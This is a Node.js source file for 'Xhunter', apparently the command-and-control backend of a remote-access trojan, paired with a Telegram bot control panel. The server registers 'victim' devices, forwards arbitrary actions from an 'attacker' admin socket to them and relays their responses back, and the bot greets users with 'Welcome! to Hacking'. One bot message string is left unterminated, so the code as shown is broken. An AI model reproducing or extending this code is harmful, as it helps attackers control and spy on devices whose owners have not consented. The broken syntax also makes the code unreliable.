
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// Cargar datos desde el archivo data.json
let jsonData;
try {
  jsonData = JSON.parse(fs.readFileSync('data.json', 'utf8'));
} catch (error) {
  console.error("Error al leer data.json:", error);
  process.exit(1); // Salir con código de error si no se puede leer el archivo
}

const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const bot = new TelegramBot(jsonData.token, { polling: true }); // Usar el token de data.json

let adminSocketId = null;
let victimList = {};
let victimData = {};
let deviceList = {};

// Iniciar el servidor
const port = process.env.PORT || 8080; // Asegúrate de que el puerto sea el correcto
server.listen(port, (err) => {
  if (err) return;
  log("Server Started : " + port);
});

// Ruta de bienvenida
app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!!'));

// Conexión de Socket.io
io.on('connection', (socket) => {
  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    if (Object.keys(victimData).length > 0) {
      Object.keys(victimData).forEach((key) => socket.emit("join", victimData[key]));
    }
  });

  socket.on('request', request); // from attacker
  socket.on('join', (device) => {
    log("Victim joined => socketId " + JSON.stringify(socket.id));
    victimList[device.id] = socket.id;
    victimData[device.id] = { ...device, socketId: socket.id };
    deviceList[socket.id] = {
      "id": device.id,
      "model": device.model
    };
    socket.broadcast.emit("join", { ...device, socketId: socket.id });
  });

  socket.on('disconnect', () => {
    if (socket.id === adminSocketId) {
      adminSocketId = null;
    } else {
      response("disconnectClient", socket.id);
      Object.keys(victimList).forEach((key) => {
        if (victimList[key] === socket.id) {
          delete victimList[key];
          delete victimData[key];
        }
      });
    }
  });
});

// Función para manejar solicitudes
const request = (d) => {
  let { to, action, data } = JSON.parse(d);
  log("Requesting action: " + action);
  io.to(victimList[to]).emit(action, data);
}

// Función para manejar respuestas
const response = (action, data) => {
  if (adminSocketId) {
    log("response action: " + action);
    io.to(adminSocketId).emit(action, data);
  }
}

// LOGGER
const log = (log) => {
  console.log(log);
}

// Comando de Telegram para iniciar sesión como administrador
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome! to Hacking by@yoloeu});

// Manejo de comandos personalizados
bot.onText(/\/join/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Admin joined!');
});

// Comandos principales
bot.onText(/\/mask_on/, (msg) => {
  const chatId = msg.chat.id;
  const replyMarkup = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Select Device", callback_data: "select_device" }],
        [{ text: "Execute Action", callback_data: "execute_action" }],
        [{ text: "About Us", callback_data: "about_us" }]
      ]
    }
  };
  bot.sendMessage(chatId, "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", replyMarkup);
});

// Añadir más funcionalidades según tus necesidades...
